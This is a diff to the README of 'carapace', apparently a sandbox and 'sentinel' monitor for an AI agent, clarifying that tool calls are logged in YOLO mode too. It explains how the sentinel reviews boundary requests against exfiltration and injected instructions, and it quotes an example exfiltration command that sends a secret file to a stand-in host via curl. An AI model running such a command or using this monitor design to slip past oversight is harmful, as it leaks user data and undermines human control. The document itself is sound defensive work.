@@ -4,7 +4,7 @@ carapace lets the agent work freely inside its sandbox and reviews where it reac
 
 ## How it works
 
-1. **Tool calls are logged, not reviewed.** Every agent tool (`exec`, file edits, `read_skill`, …) runs right away and gets an action log entry and an audit entry with `approval_source="safe-list"` (see [Tool calls](#tool-calls)).
+1. **Tool calls are logged, not reviewed.** Every agent tool (`exec`, file edits, `read_skill`, …) runs right away and gets an action log entry and an audit entry with `approval_source="safe-list"`, in YOLO mode too (see [Tool calls](#tool-calls)). The name is historical: there is no list.
 2. **Boundary requests are reviewed.** What a command wants from outside the sandbox reaches the sentinel as a [boundary request](#boundary-requests), and every push to the knowledge repo as a [git push evaluation](#git-push-evaluation). The sentinel gets the action log since its last decision with each of them.
 3. **Verdict.** The sentinel is a guard rail, not a reviewer of the agent's work: it stops the agent from going haywire beyond the sandbox, changing what it was not asked to change, exfiltrating data, or following injected instructions, and lets everything else through. It returns one of four decisions:
    - **allow** -- proceed without interruption; on a git push optionally with a comment for the agent (see [Sentinel comments](#sentinel-comments)).
@@ -87,7 +87,7 @@ The cap on domain reviews follows the same cut: `agent.max_sentinel_calls_per_to
 
 No agent tool is reviewed by itself: `exec`, `read`, `write`, `str_replace`, `read_skill`, `send_file`, `show_artifact` and `read_tool_output` all run right away. The sandbox is the boundary, and a tool reaches outside only through a boundary request or a push, which are reviewed.
 
-Each call still gets an action log entry with its full arguments and an audit entry with `approval_source="safe-list"`; it is not a silent bypass. For `exec` that matters: the sentinel sees every command that ran since its last decision with the next boundary request, which is where a sequence like packing up mail and then asking for an upload host shows. A `read_skill` call tells it which skill the following requests belong to.
+Each call still gets an action log entry with its full arguments and an audit entry with `approval_source="safe-list"` (YOLO mode included); it is not a silent bypass. For `exec` that matters: the sentinel sees every command that ran since its last decision with the next boundary request, which is where a sequence like packing up mail and then asking for an upload host shows. A `read_skill` call tells it which skill the following requests belong to.
 
 Domain and credential requests have no fast path: a domain is reviewed even when it appears literally in the `exec` command, because a command like `curl "https://anything.example/?d=$(cat secret)"` names its destination too.
 
